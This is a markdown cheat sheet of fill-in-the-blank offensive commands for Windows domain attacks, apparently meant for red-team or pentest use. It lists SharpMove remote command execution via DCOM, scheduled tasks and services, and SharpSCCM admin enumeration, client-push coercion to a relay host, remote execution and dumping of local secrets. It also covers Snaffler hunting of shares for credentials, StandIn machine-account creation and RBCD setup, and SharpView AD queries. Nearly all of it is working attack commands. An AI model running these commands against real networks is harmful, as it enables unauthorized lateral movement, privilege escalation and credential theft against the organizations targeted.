# Sharp Tools

## SharpMove

### DCOM execution

Execute a command through a DCOM method.

```cmd title:"Sharp Tools Execute command with SharpMove DCOM"
SharpMove.exe action=dcom computername=$rhost_name command="$command" method=$dcom_method amsi=true
```
<!-- cheat
var rhost_name
var command
var dcom_method = printf 'MMC20\nShellWindows\nShellBrowserWindow\n' --- --header 'DCOM method'
-->

### Task Scheduler execution

Create and run a remote scheduled task.

```cmd title:"Sharp Tools Execute command with SharpMove Task Scheduler"
SharpMove.exe action=taskscheduler computername=$rhost_name command="$command" taskname=$task_name amsi=true username=$domain\$user password=$pass
```
<!-- cheat
var rhost_name
var command
var task_name
var domain
var user
var pass
-->

### Service execution

Modify and start a remote service.

```cmd title:"Sharp Tools Modify remote service with SharpMove"
SharpMove.exe action=modsvc computername=$rhost_name command="$command" amsi=true servicename=$service_name
```
<!-- cheat
var rhost_name
var command
var service_name
-->

## SharpSCCM

### Enumerate SCCM administrators

Enumerate SCCM administrative users through the SMS Provider.

```powershell title:"Sharp Tools Enumerate SCCM administrators"
.\SharpSCCM.exe get class-instances SMS_ADMIN
```
<!-- cheat -->

### Get resource ID

Resolve a device resource ID for AdminService or deployment operations.

```powershell title:"Sharp Tools Get SCCM resource ID"
.\SharpSCCM.exe get resource-id -d "$computer_name"
```
<!-- cheat
var computer_name
-->

### Trigger client push coercion

Coerce SCCM client push authentication toward a relay host.

```powershell title:"Sharp Tools Invoke SCCM client push coercion"
.\SharpSCCM.exe invoke client-push -mp "$mp_fqdn" -sc "$site_code" -t "$relay_host"
```
<!-- cheat
var mp_fqdn
var site_code
var relay_host
-->

### Execute deployment

Trigger execution against a device resource.

```powershell title:"Sharp Tools Trigger SCCM execution"
.\SharpSCCM.exe exec -rid $resource_id -r "$target"
```
<!-- cheat
var resource_id
var target
-->

### Dump local SCCM secrets

Dump locally stored SCCM secrets from disk.

```powershell title:"Sharp Tools Dump local SCCM disk secrets"
.\SharpSCCM.exe local secrets disk
```
<!-- cheat -->

## Snaffler

### Domain share hunt

Search domain shares for sensitive files and likely credential material.

```powershell title:"Sharp Tools Hunt domain shares with Snaffler"
.\Snaffler.exe -d "$domain" -c -s
```
<!-- cheat
var domain
-->

### Host list share hunt

Search a provided host list.

```powershell title:"Sharp Tools Hunt host list with Snaffler"
.\Snaffler.exe -n "$hosts" -s
```
<!-- cheat
var hosts
-->

### Directory hunt

Search a specific share or directory path.

```powershell title:"Sharp Tools Hunt a specific path with Snaffler"
.\Snaffler.exe -i "$path" -s
```
<!-- cheat
var path
-->

## StandIn

### MachineAccountQuota

Read the domain MachineAccountQuota value.

```cmd title:"Sharp Tools Read MachineAccountQuota with StandIn"
StandIn.exe --object ms-DS-MachineAccountQuota=*
```
<!-- cheat -->

### Add machine account

Create a machine account for RBCD or shadow credential chains.

```cmd title:"Sharp Tools Add machine account with StandIn"
StandIn.exe --computer "$computer_name" --make --password "$computer_pass"
```
<!-- cheat
var computer_name
var computer_pass
-->

### Set RBCD

Configure RBCD from a controlled computer to a target computer.

```cmd title:"Sharp Tools Set RBCD with StandIn"
StandIn.exe --computer "$target_computer" --sid "$controlled_computer_sid"
```
<!-- cheat
var target_computer
var controlled_computer_sid
-->

## SharpView

### Domain user

Query a domain user with SharpView.

```powershell title:"Sharp Tools Get domain user with SharpView"
.\SharpView.exe Get-DomainUser -Identity "$user"
```
<!-- cheat
var user
-->

### Object ACL

Resolve ACLs on an AD object.

```powershell title:"Sharp Tools Get object ACL with SharpView"
.\SharpView.exe Get-ObjectAcl -Identity "$target_object" -ResolveGUIDs
```
<!-- cheat
var target_object
-->
